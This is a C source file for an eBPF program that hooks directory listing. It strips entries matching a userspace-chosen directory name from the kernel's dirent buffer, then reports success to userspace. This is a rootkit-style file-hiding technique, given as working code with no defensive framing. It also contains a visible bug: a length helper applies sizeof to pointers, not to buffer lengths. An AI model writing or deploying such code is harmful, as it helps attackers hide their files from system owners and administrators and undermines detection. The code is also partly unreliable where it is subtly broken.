#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

#include "lib/vmlinux.h"

#include "structs.h"
#include "dentry.h"

static __always_inline
long notify_userspace(void *ctx, u64 pid) {
   struct rb_event e = {
      .overwrite_succed = true,
      .pid = pid,
   };
   bpf_get_current_comm(&e.command, sizeof(e.command));
   return bpf_perf_event_output(ctx, &rb, BPF_F_CURRENT_CPU, &e, sizeof(e));
}

static __always_inline
u64 * get_dirent_buf(u64 * pid) {
   return (u64*)bpf_map_lookup_elem(&map_dirent, pid);
}

static __always_inline
struct userspace_data * get_userspace_data() {
   u32 map_index__dirname_to_hid = 0;
   return (struct userspace_data *)bpf_map_lookup_elem(&map_store_dirname, &map_index__dirname_to_hid);
}

static __always_inline
int get_str_max_len(u8 * dir_to_hide, u8 * dirname, int expected_len) {
   int max_len = sizeof(dir_to_hide) < sizeof(dirname) ? sizeof(dir_to_hide) : sizeof(dirname);
   return expected_len < max_len ? expected_len : max_len;
}

static __always_inline
int patch_dirent_if_found(u32 _, struct dirents_data_t *data)
{
   if(is_end_of_buff(data->bpos, data->buff_size)) return 1;

   u8 dirname[MAX_NAME_LEN];
   struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);

   read_user__reclen(&data->d_reclen, &dirent->d_reclen);
   read_user__dirname(dirname, dirent->d_name);

   struct userspace_data * userspace_data = data->userspace_data;

   int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);

   if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
      data->patch_succeded = remove_curr_dirent(data);
      return 1;
   }

   data->d_reclen_prev = data->d_reclen;
   data->bpos += data->d_reclen;
   return 0;
}
